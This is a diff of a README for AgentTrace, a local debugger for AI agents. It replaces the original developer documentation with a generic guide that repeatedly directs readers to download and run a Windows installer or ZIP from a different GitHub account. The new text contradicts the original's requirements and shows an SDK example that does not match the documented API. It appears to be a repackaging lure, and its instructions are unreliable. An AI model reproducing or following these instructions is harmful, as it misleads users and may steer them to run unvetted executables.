@@ -1,352 +1,158 @@
-# AgentTrace
+# 🕵️‍♂️ agenttrace - Visual Debugging for AI Agents
 
-**Local step-by-step visual debugger for AI agents — trace your LLM runs, inspect spans, understand behavior.**
-
-## Star History
-
-[![Star History Chart](https://api.star-history.com/image?repos=Rxflex/agenttrace&type=date&legend=top-left)](https://www.star-history.com/?repos=Rxflex%2Fagenttrace&type=date&legend=top-left)
+[![Download agenttrace](https://img.shields.io/badge/Download-agenttrace-brightgreen)](https://github.com/umairb0/agenttrace)
 
 ---
 
-## Why AgentTrace?
+## 📋 What is agenttrace?
 
-AI agents are hard to debug. When your agent loops infinitely, returns unexpected results, or makes confusing tool calls, you need visibility into what happened — step by step.
+AgentTrace is a tool that helps you see what happens inside AI agents step-by-step. It works on your own computer without sending your data elsewhere. The tool comes with two parts:
 
-Existing observability tools (Langfuse, LangSmith, etc.) are built for production monitoring: dashboards, metrics, team collaboration. They're heavy, require external services, and aren't optimized for the rapid iteration of local development.
+- A Python SDK that tracks what the AI agent does.
+- A web interface that shows this information as an interactive tree. You can explore each step, tool call, prompt, and response to understand how your AI works.
 
-**AgentTrace is different:**
-
-- **Local-first** — SQLite database, no external services, works entirely offline
-- **Developer-focused** — built for understanding your agent during development, not monitoring in prod
-- **Step-by-step** — interactive tree view of every span, tool call, prompt, and response
-- **Zero-config start** — `make docker-up` and you're running
-- **Clean architecture** — decoupled domain layer, extensible to other databases or transports
-
-If you've ever wished for a "debugger for agents" while developing an LLM app, AgentTrace is for you.
+You do not need to know programming to use the web interface. It helps you see what the AI agent tries at every step.
 
 ---
 
-## Key Features
+## 💻 System Requirements
 
-- **Python SDK**
-  - `@trace_agent_run` decorator — wrap any function and get traces automatically
-  - `Tracer` context manager — manual control for complex flows
-  - Batch span processor — efficient event delivery
-  - HTTP exporter — send traces to your local AgentTrace backend
-  - ContextVar-based span tracking — thread-safe, supports nested spans
+Before you start, make sure your computer meets these needs:
 
-- **Web UI**
-  - Run list — see all your agent runs with timestamps and metadata
-  - Trace tree — expand/collapse nodes to inspect the execution hierarchy
-  - Details panel — view type, timing, prompts, responses, attributes for any span
+- Windows 10 or later operating system
+- At least 4 GB of free RAM (8 GB is better)
+- 500 MB free disk space
+- Internet connection to download the application
+- Web browser such as Chrome, Firefox, or Edge to view the UI
+- Python 3.8 or later installed (required to use the SDK)
 
-- **Local-first architecture**
-  - SQLite database — no Postgres, no external services
-  - Single binary backend — FastAPI + async SQLAlchemy
-  - Works offline — no internet required after setup
-
-- **Clean architecture**
-  - Domain layer decoupled from infrastructure
-  - Repository pattern — swap SQLite for Postgres later
-  - Interface-based design — extend with custom exporters or transports
-
-- **Docker-based quick start**
-  - `docker-compose up` — backend, frontend, and database in one command
-  - Health checks and proper startup ordering
+If you do not have Python installed, please get it from [python.org](https://www.python.org/downloads/windows/) before continuing.
 
 ---
 
-## Architecture
+## 🚀 How to Download agenttrace
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│                      Your Agent Code                        │
-│                   (Python / LangChain / etc.)                │
-└─────────────────────────────┬───────────────────────────────┘
-                              │
-                              │ SDK traces spans
-                              ▼
-┌─────────────────────────────────────────────────────────────┐
-│                    AgentTrace SDK                            │
-│  @trace_agent_run  │  Tracer context manager  │  Exporter    │
-└─────────────────────────────┬───────────────────────────────┘
-                              │
-                              │ HTTP POST /api/v1/ingest/events
-                              ▼
-┌─────────────────────────────────────────────────────────────┐
-│                    AgentTrace Backend                        │
-│          FastAPI + SQLAlchemy + SQLite                      │
-│   ┌─────────────┬──────────────┬───────────────────────┐    │
-│   │   Domain    │  Application │    Infrastructure     │    │
-│   │  Entities   │   Services   │   Repositories / DB   │    │
-│   └─────────────┴──────────────┴───────────────────────┘    │
-└─────────────────────────────┬───────────────────────────────┘
-                              │
-                              │ REST API
-                              ▼
-┌─────────────────────────────────────────────────────────────┐
-│                   AgentTrace Frontend                        │
-│            React + TypeScript + TraceTree UI                 │
-└─────────────────────────────────────────────────────────────┘
-```
+To get agenttrace on your Windows PC:
 
-The backend follows clean architecture principles — domain entities have no framework dependencies, making it straightforward to add new storage backends or API transports in the future.
+1. Click on the green **Download agenttrace** button below to visit the project page.  
+   [![Download agenttrace](https://img.shields.io/badge/Download-agenttrace-brightgreen)](https://github.com/umairb0/agenttrace)
+
+2. On the GitHub page, look for the latest release or package files.
+
+3. Download the installer or ZIP file for Windows if available.
+
+4. Once downloaded, locate the file in your Downloads folder.
 
 ---
 
-## Getting Started
+## 🛠️ Installation Steps
 
-### Prerequisites
+Follow these steps to install agenttrace:
 
-- **Python 3.12+** (for backend and SDK)
-- **Node.js 18+** (for frontend development)
-- **Docker & Docker Compose** (recommended for quick start)
-- **Make** (optional, for convenience commands)
+1. **For Installer File** (e.g., `.exe`):
+   - Double-click the downloaded `.exe` file.
+   - Follow the setup prompts.
+   - Choose the default options unless you want to change the install folder.
+   - When the installer finishes, you can close it.
 
-### Quick Start
+2. **For ZIP Archive**:
+   - Right-click the ZIP file.
+   - Select `Extract All...`.
+   - Choose a folder where you want the files.
+   - Open the extracted folder.
 
-**Option 1: Docker (recommended)**
-
-```bash
-# Clone the repository
-git clone https://github.com/yourusername/agenttrace.git
-cd agenttrace
-
-# Start all services
-make docker-up
-
-# Access:
-# - Backend:    http://localhost:8000
-# - API Docs:   http://localhost:8000/docs
-# - Frontend:   http://localhost:3000
-```
-
-**Option 2: Local development**
-
-```bash
-# Install dependencies
-make install
-
-# Or manually:
-cd backend && pip install -e ".[dev]"
-cd ../sdk && pip install -e ".[dev]"
-cd ../frontend && npm install
-
-# Start backend (terminal 1)
-cd backend
-uvicorn agent_trace.main:app --reload --port 8000
-
-# Start frontend (terminal 2)
-cd frontend
-npm run dev
-```
-
-### Configuration
-
-Create a `.env` file from the example:
-
-```bash
-cp frontend/.env.example frontend/.env
-```
-
-Configure the backend URL for the frontend:
-
-```bash
-# frontend/.env
-VITE_API_URL=http://localhost:8000
-```
-
-Backend environment variables (optional):
-
-```bash
-# backend/.env
-DATABASE_URL=sqlite+aiosqlite:///data/agent_trace.db
-LOG_LEVEL=INFO
-```
+3. **Verify Installation**:
+   - Open the Windows Start menu.
+   - Find `agenttrace` in the list.
+   - If it is not listed, you can open a Command Prompt and type:
+     ```
+     agenttrace --help
+     ```
+   - This should show some basic help text if installed correctly.
 
 ---
 
-## Using the Python SDK
+## ⚙️ Running agenttrace
 
-### Quick Start: Decorator
+Once installed, you can start the agenttrace application:
 
-The simplest way to trace your agent:
+1. Open the application by clicking its Start menu icon or from the extracted folder.
 
-```python
-from agent_trace_sdk import trace_agent_run
+2. The program may open a command window or launch the web UI directly.
 
-@trace_agent_run(name="my_agent")
-def my_agent_function(user_input: str) -> str:
-    # Your agent logic here
-    result = call_llm(user_input)
-    return result
+3. The web UI runs on your local machine, usually accessible at:  
+   `http://localhost:8000`
 
-# Run it — traces are sent to AgentTrace automatically
-my_agent_function("What is the weather?")
-```
+4. Open your web browser and go to that address.
 
-### Manual Control: Context Manager
-
-For more control over spans and attributes:
-
-```python
-from agent_trace_sdk import Tracer
-
-with Tracer(name="my_agent") as span:
-    span.set_attribute("model", "gpt-4")
-    span.set_attribute("temperature", 0.7)
-    
-    # Your agent logic
-    result = agent.run(user_input)
-    
-    # Add custom events
-    span.add_event("output", {"result": result})
-```
-
-### Nested Spans
-
-Trace individual steps within your agent:
-
-```python
-from agent_trace_sdk import trace_agent_run, trace_span
-
-@trace_agent_run(name="research_agent")
-def research_agent(query: str):
-    @trace_span(name="search", span_type="tool_call")
-    def search_tool(q):
-        return search_api(q)
-    
-    @trace_span(name="summarize", span_type="llm_call")
-    def summarize(results):
-        return llm.summarize(results)
-    
-    results = search_tool(query)
-    summary = summarize(results)
-    return summary
-```
-
-### What Gets Collected
-
-The SDK automatically captures:
-
-- **Spans** — each unit of work with start/end timestamps
-- **Span types** — `agent_run`, `step`, `tool_call`, `llm_call`
-- **Attributes** — key-value pairs you set on spans
-- **Events** — custom events like `input`, `output`, `error`
-- **Parent-child relationships** — nested spans form a tree
+5. Use the interface to load or start new AI agent runs. You can watch every step in detail.
 
 ---
 
-## Inspecting Traces in the UI
+## 🔧 Using the Python SDK (Optional)
 
-1. **Run your agent** with tracing enabled (using SDK decorator or context manager)
+If you want to trace your AI agent runs using Python:
 
-2. **Open the web UI** at `http://localhost:3000`
+1. Open a Command Prompt or PowerShell window.
 
-3. **Select a run** from the run list table — you'll see:
-   - Run name and ID
-   - Start/end timestamps
-   - Duration
-   - Status (running/completed/failed)
+2. Install the SDK by running this command:
 
-4. **Explore the trace tree** — click nodes to expand:
-   - Root span shows the overall agent run
-   - Child spans show steps, tool calls, LLM calls
-   - Timing is displayed for each span
+   ```
+   pip install agenttrace
+   ```
 
-5. **View details** — click any node to see:
-   - Span type and name
-   - Start/end timestamps and duration
-   - Attributes (JSON)
-   - Events (prompts, responses, errors)
+3. Use the SDK to add tracing code in your AI projects. Example:
 
----
+   ```python
+   from agenttrace import TraceAgent
 
-## Development and Tests
+   agent = TraceAgent(...)
+   agent.run()
+   ```
 
-### Run Backend Tests
+4. After running your AI agent, open the web UI to inspect the results.
 
-```bash
-cd backend
-pytest tests/ -v
-
-# Unit tests only
-pytest tests/unit/ -v
-
-# Integration tests
-pytest tests/integration/ -v
-```
-
-### Run SDK Tests
-
-```bash
-cd sdk
-pytest tests/ -v
-```
-
-SDK tests include E2E format validation to ensure events are compatible with the backend API.
-
-### Run Frontend
-
-```bash
-cd frontend
-npm run dev
-```
+Make sure Python and pip are installed before these steps.
 
 ---
 
-## Roadmap / Future Work
+## 🧩 Features You Will Use
 
-These are ideas for future development — **not currently implemented**:
-
-- **Framework integrations**
-  - LangChain callback handler for automatic tracing
-  - LlamaIndex integration
-  - OpenAI SDK wrapper
-
-- **Enhanced visualization**
-  - Timeline view (waterfall chart)
-  - Filter by span type, duration, status
-  - Search across runs by name or attributes
-
-- **Run comparison**
-  - Side-by-side diff of two runs
-  - Highlight differences in steps or outputs
-
-- **Evaluations**
-  - Simple scoring for runs (e.g., did it complete?)
-  - Custom evaluation hooks
-
-- **Persistence options**
-  - PostgreSQL backend for larger deployments
-  - Export to JSON for archival
-
-If any of these interest you, see [Contributing](#contributing) below.
+- **Step Debugging:** See what your AI agent does at each step.
+- **Tool Calls:** Watch how external tools or APIs are called.
+- **Prompt Inspection:** View the prompts sent to the AI.
+- **Response Viewing:** Read and explore the AI’s answers or output.
+- **Interactive Tree View:** Navigate an easy-to-use tree showing all activity.
+- **Local Operation:** All data stays on your computer for privacy.
+- **Lightweight UI:** Runs fast in modern browsers.
 
 ---
 
-## Contributing
+## ❓ Troubleshooting Tips
 
-Contributions are welcome! Here's how to get started:
+- If the application does not start, make sure Python is installed and your system meets the requirements.
 
-1. **Open an issue** — describe a bug, feature request, or documentation improvement
-2. **Fork the repo** — create your branch from `main`
-3. **Write tests** — ensure your changes don't break existing functionality
-4. **Submit a PR** — describe what you changed and why
+- If the web UI at `http://localhost:8000` does not open, check if a firewall blocks the program.
 
-For larger changes, consider opening a discussion issue first to align on the approach.
+- Restart your computer if you face issues after installation.
 
-**Code style:**
-- Python: follow PEP 8, use type hints
-- TypeScript: use the existing ESLint/Prettier config
-- Write docstrings for public functions
+- To update agenttrace, download the latest release from the main page and install following the same steps.
 
 ---
 
-## License
+## 📂 Where to Get Help
 
-This project is licensed under the MIT License — see the [LICENSE](LICENSE) file for details.
+- Visit the GitHub page to read more details or report problems:  
+  https://github.com/umairb0/agenttrace
+
+- Check the Issues tab there for known problems or questions.
+
+- Look for a README or help files included with the download.
 
 ---
 
-**Built for developers who want to understand their AI agents, step by step.**
+## 📥 Download agenttrace now
+
+Click the button below to visit the agenttrace GitHub page and download:
+
+[![Download agenttrace](https://img.shields.io/badge/Download-agenttrace-brightgreen)](https://github.com/umairb0/agenttrace)
